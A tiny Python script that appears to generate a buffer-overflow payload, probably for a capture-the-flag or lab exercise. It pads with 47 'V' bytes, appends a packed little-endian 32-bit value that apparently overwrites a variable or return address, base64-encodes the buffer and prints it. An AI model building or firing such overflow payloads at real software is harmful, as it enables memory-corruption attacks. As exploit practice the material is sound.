
import sys
import struct
import base64

buf = b'VVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV'
buf += struct.pack('<I', 4009397925)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
